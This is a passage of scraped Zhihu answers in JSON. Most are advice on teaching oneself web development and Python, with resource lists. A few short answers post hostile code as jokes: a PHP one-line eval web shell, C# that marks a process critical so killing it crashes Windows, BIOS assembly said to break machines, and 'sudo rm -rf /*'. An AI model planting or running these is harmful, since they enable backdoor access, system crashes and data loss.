把自己的经验写下来，希望对于那些有心学习编程但无从下手的朋友提供一些帮助和鼓励。1. 我的自学编程之路1）基础刚开始的时候，我对搭建网站一无所知。为了给自己迅速建立一个框架，我在Google上面泡了整整一天，了解了HTML，CSS，JavaScript，Ajax，jQuery，React，SQL，服务器脚本等等知识，不求精通，只是了解每一项技术是干嘛的，另一方面建立起了一个学习的roadmap，这样大概知道做一个Web App需要哪些知识，分别学习的主次顺序。重点推荐两个资源：Python基础知识：Learn Python the Hard WayWeb App基础知识：@张秋怡的答案写的通俗易懂，极力推荐。有了这个roadmap，我明白了前端三大必须掌握技能HTML，CSS和JavaScript，花了大概10天左右把W3Schools上的教程全部过了一遍，然后试着写了几个网页，感觉自己写的很没有底气。于是根据知乎和豆瓣上的推荐，买了《JaveScript DOM》和《Head First HTML与CSS》，边看书边把例子过了一遍。W3Schools: www.w3schools.com/JavaScript：JavaScript DOM编程艺术HTML &amp; CSS : Head First HTML与CSS（第2版）前端是需要慢慢学习的，在看完上面的资料后，虽然能写出来一些挺漂亮的页面，但是我自己知道很多都是不符合标准的，更不要说代码风格什么的。这只能通过不断地积累和增加代码量来提高。由于明白服务器端需要耗费自己大量的时间，所以在发现自己能够按照构思勉强实现网页之后，我就把学习中心放到了服务器端上。不过每天还是会抽空写一写网页，避免手生。2）服务器端最先了解的是HTTP协议，也就是浏览器和服务器之间是如何通信的。也就是当你在浏览器里键入网址按下回车直到网页显示在你浏览器的这个过程中，浏览器和浏览器之间发生了什么事情。这是很有意思的内容，我是以读小说的心情了解了这部分内容。了解这部分后，你就会明白类似为什么有时候会有404页面？在百度搜索框里键入的搜索词是如何提交到百度服务器的？为什么重新登录知乎的时候就不用再输入密码了？之类的问题了。HTTP协议学习资料：In Introduction to HTTP Basics@Vamei的博客：协议森林了解了HTTP协议之后，我就多少有些入迷了。看似神秘难懂的现象其实原理并不复杂，你反而会被吸引。接下来就进入到我投入时间最多的部分了——后端开发。记得当时了解Web开发的MVC（Model-View-Controller）模式后，有一种心血喷涌的感觉，觉得太有意思了（程序员别喷，我就是这么没见过世面）。我们以知乎为例子来说明MVC是个啥：&lt;img src=\"https://pic3.zhimg.com/v2-0f9a54678b79094188b7e281cc7ffd5e_b.png\" data-rawwidth=\"1029\" data-rawheight=\"623\" class=\"origin_image zh-lightbox-thumb\" width=\"1029\" data-original=\"https://pic3.zhimg.com/v2-0f9a54678b79094188b7e281cc7ffd5e_r.jpg\"&gt;每个人的主页都是相同的布局和风格，例如最上面的菜单搜索栏，颜色分割，左边显示动态等，右边是个人信息等，然后具体的内容却因人而异——每个人的头像，名字，动态都是不一样的。那么知乎是如何保证每一个人看到的都是自己的主页呢？你可以把这个相同的布局想象成一个模板，里面有一个个空格子，当你用你的账户登陆页面时，想象你的电脑里有无数个小人根据你的账号从知乎后台的数据库里取出你的头像，动态，认证信息等等内容，然后对应着模板上规定好的位置，把对应的内容填进去。这些小人的动作实在是太快了，以至于你觉得这是在瞬间完成的。上面所说的模板就是MVC中的V，是View的缩写，负责显示。这样做的好处在于，如果知乎有一天突然想改变一下个人主页的风格，那么只需要改变这一个模板，然后几千万注册用户的主页就相应的变化了，因为模板是公用的，是不是省了很多事情？（早期的Web开发可不是这样哟，你可能要一个个用户去改，非常麻烦。）而这些小人除了摆放内容，它们真正负责的是业务逻辑，我们把他们叫做Controller，也就是MVC中的C。例如当你登陆的时候，这些小人要检查你的用户名是不是准确的，如果准确，它们要去数据库里取出你请求的信息等，如果用户名错误，它们要拦截住你的登陆。它们的职责还有很多，无法一一列举。在实际中，这些小人做的事情其实就是Python（或者其它脚本语言）做的事情。最后，MVC中的Model其实就是传给View的数据，包括上面的头像，用户名，动态等因人而异的数据。这些数据在知乎服务器上是以数据库表格（table）的形式存在的，你可以把它们想象成很多不同的excel表格，不同的表格储存着不同的信息，有些记录着知乎用户的个人信息，有些记录着回答，有些记录着评论等等，而这些表格之间又彼此联系，当你在知乎的不同网页间跳转的时候，上面说的那些小人就根据你的要求，组合对应的表格取出对应的数据，然后把他们放到模板对应的空格里，发送给浏览器。然后浏览器根据你写的CSS，用不同的颜色，大小等等，将数据很漂亮的显示出来。这样做的好处是什么呢？虽然你最终在浏览器里看到的是一个完整的页面，但是在后端逻辑上它们都是区分开的——模型（M），视图（V）和控制器（C）的区分就保证了较高的可维护性——我可以随时修改主页的显示并看到效果，同样我可以随时加入一些业务逻辑。如果你的学习坚持到这里了，首先要恭喜你。其次你可能已经知道一些非常成熟的Python Web框架了，例如Django，Flask等等，并且你可能看到了很多小白教程教你直接使用，毕竟大部分人可能觉得没有必要重复造轮子。本来为了省事，我也打算直接用框架。我是在设计数据库的时候，当时在看SQLAlchemy文档，觉得相对自己的项目SQLAlchemy太过复杂，所以我决定自己写自己的ORM（名词不懂没关系），这对于当时的我来说是一件难度非常大的事情。于是我投入了极大的精力每天都在看关于SQL和Python相关的教程和资料，Python核心编程（第二版） 给了我很大的启发。在自己完成了ORM后，又写了URL处理函数，同样没有用任何现成的Web框架。现在回头看，我认为这一段时间的造轮子是提升编程能力最快的时候。比如为了写ORM，就必须去花很多时间学习SQL，去了解Python里面的metaclass，而如果用一个现成的框架，我很有可能偷懒不去关注某些细节。而不出问题还好，一旦出问题，我就只能跪。另外，造轮子迫使我在开始的时候就构思整个框架，因为我必须尽可能的考虑到所有的情况，于是就会不断的强迫自己完善知识体系，和别人的代码作对比从而改进自己的，这个过程充满了无尽的挫败感，但是得来的成就和快乐也是无可比拟的。SQL书籍：Sams Teach Yourself MySQL in 21 DaysPython：Python核心编程（第二版）Github上的优质Python资源：CodementorIO/Python-Learning-Resources过程中还牵涉到部署，我的网站是跑在Linux上的。关于部署网上有非常多的优质教程，一搜一大把。这里就不再赘述。这些是我学习大致路线，当然过程中充满着小的磕磕绊绊，虽然网站上线了，貌似运行还比较顺利，但是如果以一个程序员的标准来要求自己，自己依然非常菜鸟。不过我并没有以前那样惧怕技术了，就像你明白魔术的背后的原理后，会更多的思考原理本身。2. 自学编程需要注意的问题很多人都推荐小白第一门语言选Python，因为语法简单。这句话只说了一半，Python确实容易上手，对初学者的门槛很低。但我发现，对于小白真正的门槛在于系统知识，这就和用什么语言完全没有任何关系了。例如很多人学完了Python的语法，觉得确实简单，但是转头去用Python标准库的时候，却发现自己连文档都看不懂。标准库提供了Python和其它系统功能的接口，最终实现了Python和系统之间的互动。读标准库需要系统知识，比如操作系统，数据库，进程和线程，socket编程，网络协议等等，这些对于编程小白来才构成很高的门槛，但是只有学会这些，才能真正发挥出Python的威力来。这也是我觉得自己的经历对小白是有价值的一个原因。因为设计一个动态的网页是一个很不错的练手Project。建立网页（Web App）会逼迫你了解从你在浏览器里键入地址按下回车到网页显示在浏览器的过程中，浏览器，网络，服务器都干了些什么。具体到技术上面，你不得不去学习前端的HTML，CSS和JavaScript，后端的脚本，数据库，操作系统等。也就是说，这个过程能够促使你去主动学习上面提到的系统知识，如果你再做另外一个项目，你就不会像现在这样无从下手，而有能力去进行一些技术性的探讨，所以我认为这是一个非常好的练手项目。1）一定要空出时间补充理论知识很多人会强调learn by doing，边做项目边学习，这也是我自己采用的方式。在这种方式中，你不断犯错，改正……学习效率非常高。但是，很多人走了极端，最后的结果就是不注意理论知识的学习。你会发现自己Google的能力越来越高，但是真实的编程能力并没有得到提升。如果有这种情况，你需要反思一下。一种可能是你太过于依赖各种成熟的框架，结果编程就变成了用「胶水」去粘合不同的框架完成需求。就好比你的Web App用了SQLAlchemy，虽然自己不太懂SQL，但是网站跑的也还不错。这时候如果数据库出现了问题，那你就只能跪了。另外一种可能是你完全沉浸在做项目中，忽略了学习理论知识。做项目虽然充满困难，但回报是强烈的成就感，很容易沉浸其中。我觉得这是极其错误的。首先半路出家的程序员都没有经过系统的学习，没有形成自己的知识体系，如果你不懂数据结构，算法复杂度，操作系统这些理论，那么你能达到的高度就极其有限。所以，在每天做项目的同时，一定要保证抽出一定的时间，恶补理论知识。这部分的书单在豆瓣和知乎上都有很多总结，可以自行搜索。2）不要太纠结于无意义的问题，比如什么框架好，XX语言比XX语言好啦这种问题。前期确定了练手项目，就去专心积累代码量，积累基础知识。那些你现在还看不懂的炫酷技术你慢慢也就能明白是怎么回事了，反而没有基础，再炫酷的框架对你而言都是天书。3）学会发问。好问题是建立在你自己已经实践或者思考的基础上问出来的，这是对自己的负责，也是对别人的尊重。不要一遇到困难就喜欢直接上网搜索：「这个问题是怎么回事啊？」，「我不明白你能不能帮我看看……」。4）学好英语。THE END最后，给自己打个广告，如果学英语，一定要关注我。http://weixin.qq.com/r/ETt0bGzEkzHsrSgP924D (二维码自动识别)", "praise_num": 3735, "answer_object_id": "225878233ccee442466c8d4585335920"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/465238782", "answer_id": 465238782, "comments_num": 2, "answer_article": "大一刚开始学c++的时候，写acm的题，机房电脑经常蓝屏。应该很多同僚有这种经验吧？", "praise_num": 11, "answer_object_id": "ab9804812552d9654ff498df50232c70"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/475255922", "answer_id": 475255922, "comments_num": 88, "answer_article": "一行代码能带你开车，只要以如下开头“magnet:?xt=urn:btih:”", "praise_num": 515, "answer_object_id": "0f78ad9b69d87ed8670f840528f5156d"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/394020225", "answer_id": 394020225, "comments_num": 32, "answer_article": "1.第一 python入门基础：这些都是基础，基本概念必须清楚！学习Python需要掌握如下基础知识以及相关技能。1.Python基础知识（变量、语句、数据类型、数值类型、字符串、布尔类型、列表、字典、元组、条件语句、循环语句、函数、装饰器、面向对象、网络socket、爬虫）2.Python基础库（模块、包、系统模块、三方模块）3.python文件处理（读、写、执行、）4.python字符统计5.python数据排序2.学习方法：万虐终成神！敲代码，解决BUG才是学习，无数次的看视频不是学习，至少不会学好。只记Python基础语法，却没什么鸟用。就像幼儿园，老师在黑板上写的‘肉’字，记住这个字咋写，一笔一划的记住，只需要半天，但是把这个词和你平时吃的东西绑定，以至于后面你想到这个字，就流口水，需要日常的重复训练。同理：无方向的看书，看视频也没什么用，其实可以通过直接实战来上手，比如：文件操作字符排序网络编程错误的学习方法：很多人在学习Python的时候常常会犯下面一种情况：买一本厚厚的编程指南，逼自己看完，记住每个语法，闭门看书三个月，吃透一本书，最后一行代码也写不出来。正确的学习方法：编程就像骑自行车，买一本&lt;&lt;骑自行车大全&gt;&gt;是没有什么用的。正确姿势：掌握最基础的姿势，就可以骑上车出发了，实际联系几天，摔几跤，基本就学会了。3.自我进行测评：基础门槛，不过需要找原因并解决。很多朋友反馈：Python基础语法都学会了，但不知如何写项目进阶？1.List，Dict特性倒背如流，就是无法写出实际的项目。2.各种书籍也看，写不出东西。3.各种视频也看，写不出东西。4.各种大会也去，名词高大上，但是没学到具体的技能。对自我进行检测：1.给你一个字符串“come baby,python rocks!” 如何统计里面字母o出现的次数！思路：遍历字符串，定义一个变量，每次o出现，都+12.给你一个字符串“come baby,python rocks!” 如何统计这里面所有字母出现的次数！（普通变量肯定无法完成。）思路：需要使用字典这类复杂的数据结构处理，字母当key，出现的次数当value，每个key出现，对应的value+13.给你一个字符串“come baby,python rocks!” 如何统计这里面字母出现次数的前三名！思路：排序，取出前三后续扩展练习：1.给你一个字符串“come baby,python rocks!” 怎么统计出现次数前三的字母。2.一个nginx日志文件，怎么统计IP出现次数前三的url。3.一个nginx日志文件，统计IP出现前三后，如何存入MySQL数据库。4.存入MySQL中的日志文件，如何输出给浏览器端显示。5.如何美化前端表格等等。4.重要学习部分：python库怎么学模块将多个代码块（按功能）定义到同一个文件中。别的文件中使用时则先导入模块，在调用模块内变量或函数。模块命名要符合python变量的命名规范1.建议全小写英文字母和数字2.避免与常用模块或第三方模块名称冲突控制模块内代码在使用python mod.py时执行，在导入时不执行1.通过Global内变量__name__进行判断2.当以python mod.py运行脚本时__name__变量为__main__字符串3.当以模块导入时__name__为模块名称字符串包将不同模块文件放在不同文件夹内，包文件夹下面需要有__init__.py文件用以声明该文件为Python包。使用时需要从包内导入模块后调用模块中变量和函数。常用系统模块：os,sys,time,datetime,urllib,xml,json,email,csv,collections,math,zipfile,trafile,hashlib常用三方模块：requests,pyquery,django,flask,mysqlclient,paramiko,redis,lxml,dateutils,ipaddr,netaddr模块学习方法：1.先知道有没有2.用的时候在查内置工具：dir、help搜索引擎：google、百度5.再说一个python目前一个热点：python Web应用（python全栈）1.Python基础入门（入门、数据类型、条件表达、循环语句）2.Python基础进阶（文件操作、函数、装饰器、模块、面向对象、网络编程）3.Python前端知识（Html、Css、Js、Jquery、Bootstrap、）4.Python高级用法（Django、Flask、数据库操作、MVC、ORM、Admin、template）5.Python项目实战（电商项目、爬虫项目、常用组件、运维项目、代码调优）6.Python高级进阶（数据算法、代码规范、面试技巧）重要：多抄、多写、多想、多问、多看、多听、多说1.学习编程就是为了解决实际的问题，把自己在工作或学习中的重复工作程序化2.谷歌和度娘3.加入开源社区（多看、多分享、多交流）4.参加培训辅导（仔细听课、跟上课堂学习，有问题做记录，课后查阅资料或请求他人）5.善于记录笔记，不断总结，查漏补缺。6.python前景之一：大数据分析1.python基础入门（入门、数据类型、条件表达、循环语句）2.python基础进阶（文件操作、函数、装饰器、模块、面向对象、网络编程）3.python数据采集：（外部数据源导入分析&amp;爬虫自己采集数据源分析）4.数据分析：（各种库，如Pandas库，Numpy库必备数据库）5.数据可视化：（matplotlib库）重要：实用即可，最具价值，切莫花哨不适用7.python前景之二：机器学习直接看应用吧：看起来是个云端的概念1.计算机视觉典型的应用包括：人脸识别、车牌识别、扫描文字识别、图片内容识别、图片搜索等等。2.自然语言处理典型的应用包括：搜索引擎智能匹配、文本内容理解、文本情绪判断，语音识别、输入法、机器翻译等等。3.社会网络分析典型的应用包括：用户画像、网络关联分析、欺诈作弊发现、热点发现等等。4.推荐典型的应用包括：虾米音乐的“歌曲推荐”，某宝的“猜你喜欢”等等。学习路线：数学基础：微积分、线性代数、概率与统计、典型算法2.编程语言、工具和环境:pythonpython有着全品类的数据科学工具，从数据获取、数据清洗到整合各种算法都做得非常全面。网页爬虫: scrapy数据挖掘: pandas：模拟R，进行数据浏览与预处理。numpy：数组运算。scipy：高效的科学计算。matplotlib：非常方便的数据可视化工具。机器学习: scikit-learn：远近闻名的机器学习package。未必是最高效的，但是接口真心封装得好，几乎所有的机器学习算法输入输出部分格式都一致。而它的支持文档甚至可以直接当做教程来学习，非常用心。对于不是非常高纬度、高量级的数据，scikit-learn胜任得非常好(有兴趣可以看看sklearn的源码，也很有意思)。libsvm：高效率的svm模型实现(了解一下很有好处，libsvm的系数数据输入格式，在各处都非常常见)keras/TensorFlow：对深度学习感兴趣的同学，也能很方便地搭建自己的神经网络了。自然语言处理: nltk：自然语言处理的相关功能做得非常全面，有典型语料库，而且上手也非常容易。交互式环境： ipython notebook：能直接打通数据到结果的通道，方便至极。强力推荐。3.编程语言、工具和环境:RR最大的优势是开源社区，聚集了非常多功能强大可直接使用的包，绝大多数的机器学习算法在R中都有完善的包可直接使用，同时文档也非常齐全。常见的package包括：RGtk2, pmml, colorspace, ada, amap, arules, biclust, cba, descr, doBy, e1071, ellipse等等。另外，值得一提的是R的可视化效果做得非常不错，而这对于机器学习是非常有帮助的。4.其他语言相应资深程序员GG的要求，再补充一下Java和C++相关机器学习package。Java系列WEKA Machine Learning Workbench 相当于java中的scikit-learn其他的工具如 Massive Online Analysis（MOA）、MEKA 、 Mallet等也非常有名。C++系列mlpack，高效同时可扩充性非常好的机器学习库。Shark：文档齐全的老牌C++机器学习库。8.相关学习文档资料：目前比较好的文档还是英文，国内资料没有可以加我的学习群473391225，自己去下载。国内python资源汇总​pan.baidu.com----------------------------------------------------------------------------------------------2018/05/25更新：开发文档资源整理（一）环境管理管理 Python 版本和环境的工具p：非常简单的交互式 python 版本管理工具。官网pyenv：简单的 Python 版本管理工具。官网Vex：可以在虚拟环境中执行命令。官网virtualenv：创建独立 Python 环境的工具。官网virtualenvwrapper：virtualenv 的一组扩展。官网包管理管理包和依赖的工具。pip：Python 包和依赖关系管理工具。官网pip-tools：保证 Python 包依赖关系更新的一组工具。官网conda：跨平台，Python 二进制包管理工具。官网Curdling：管理 Python 包的命令行工具。官网wheel：Python 分发的新标准，意在取代 eggs。官网包仓库本地 PyPI 仓库服务和代理。warehouse：下一代 PyPI。官网 Warehouse：PyPA 提供的 PyPI 镜像工具。官网 bandersnatchdevpi：PyPI 服务和打包/测试/分发工具。官网localshop：本地 PyPI 服务（自定义包并且自动对 PyPI 镜像）。官网分发打包为可执行文件以便分发。PyInstaller：将 Python 程序转换成独立的执行文件（跨平台）。官网dh-virtualenv：构建并将 virtualenv 虚拟环境作为一个 Debian 包来发布。官网Nuitka：将脚本、模块、包编译成可执行文件或扩展模块。官网py2app：将 Python 脚本变为独立软件包（Mac OS X）。官网py2exe：将 Python 脚本变为独立软件包（Windows）。官网pynsist：一个用来创建 Windows 安装程序的工具，可以在安装程序中打包 Python本身。官网构建工具将源码编译成软件。buildout：一个构建系统，从多个组件来创建，组装和部署应用。官网BitBake：针对嵌入式 Linux 的类似 make 的构建工具。官网fabricate：对任何语言自动找到依赖关系的构建工具。官网PlatformIO：多平台命令行构建工具。官网PyBuilder：纯 Python 实现的持续化构建工具。官网SCons：软件构建工具。官网交互式解析器交互式 Python 解析器。IPython：功能丰富的工具，非常有效的使用交互式 Python。官网bpython：界面丰富的 Python 解析器。官网ptpython：高级交互式Python解析器， 构建于python-prompt-toolkit 之上。官网文件文件管理和 MIME（多用途的网际邮件扩充协议）类型检测。imghdr：（Python 标准库）检测图片类型。官网mimetypes：（Python 标准库）将文件名映射为 MIME 类型。官网path.py：对 os.path 进行封装的模块。官网pathlib：（Python3.4+ 标准库）跨平台的、面向对象的路径操作库。官网python-magic：文件类型检测的第三方库 libmagic 的 Python 接口。官网Unipath：用面向对象的方式操作文件和目录。官网watchdog：管理文件系统事件的 API 和 shell 工具官网", "praise_num": 618, "answer_object_id": "86ca6818a1070b8303bb9bba9e25eaf9"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/444846474", "answer_id": 444846474, "comments_num": 5, "answer_article": "using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\npublic class CriticalProcess\n{\n    [DllImport(\"ntdll.dll\", SetLastError = true)]\n    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);\n\n    static void Main(string[] args)\n    {\n        int isCritical = 1;\n        int BreakOnTermination = 0x1D; \n        Process.EnterDebugMode();\n        NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));\n    }\n}\n", "praise_num": 26, "answer_object_id": "4243065364804185e51f0d98a9b395e9"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/450569526", "answer_id": 450569526, "comments_num": 99, "answer_article": "一句话木马，想做什么就做什么&lt;?php @eval($_POST['pass']) ?&gt;", "praise_num": 389, "answer_object_id": "2efe3f85b06c379d28e236bf6f701b67"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/444738395", "answer_id": 444738395, "comments_num": 11, "answer_article": "在初始化CPU的BIOS代码里放上这段，最好是没有配置好各种向量表之前FFFFFF94  B880080080        mov eax,0x80000880FFFFFF99  66BAF80C          mov dx,0xcf8FFFFFF9D  EF                out dx,eaxFFFFFF9E  EAFAFFFFFF0800    jmp dword 0x8:0xfffffffa...FFFFFFFA  80C204            add dl,0x4FFFFFFFD  B002              mov al,0x2FFFFFFFF  EE                out dx,alAMD上是有效的，Intel无效，某厂因此亏了几十亿", "praise_num": 43, "answer_object_id": "9c0e2c02f1eb893cf3d2e62aec2a2028"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/479403570", "answer_id": 479403570, "comments_num": 178, "answer_article": "领导：小张，这文件夹里有98个PPT，你把它们的文件名统计一下，给我一个txt。小张：给我10秒。1.新建文本文档2.dir \\\\?\\%1 /a:-d /b /o /p /w &gt;FileList.txt3.重命名为Fake.bat4.将文件夹拖到bat上小张：老板，搞定了！顺便还做了一个自动输出的工具，您可以用。领导：小伙挺能干的，我这里还有很多活儿，都给你吧。对了，记得全部自动化啊。^-^代码来自：rainssong/RainsScriptLib常见问题：为什么不直接输入代码，还写个bat？&gt;复用为什么不用tree命令？&gt;会输出多余文字为什么不用dir &gt;out.txt&gt;省掉参数会输出多余信息，不符合老板要求", "praise_num": 2099, "answer_object_id": "2556d570ef8fb78444cc5d37d378ed86"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/453251748", "answer_id": 453251748, "comments_num": 182, "answer_article": "sudo rm -rf /*能让你跑路或者被tjjtds评论区：你们的输入法经历了什么…&lt;img src=\"https://pic1.zhimg.com/v2-0e0b877c3cd96a7cf38c3a75c16069fc_b.gif\" data-rawwidth=\"296\" data-rawheight=\"182\" data-size=\"normal\" data-caption=\"\" data-thumbnail=\"https://pic1.zhimg.com/v2-0e0b877c3cd96a7cf38c3a75c16069fc_b.jpg\" class=\"content_image\" width=\"296\"&gt;", "praise_num": 402, "answer_object_id": "835887ac1a52682441e40c7d66dc91bd"}]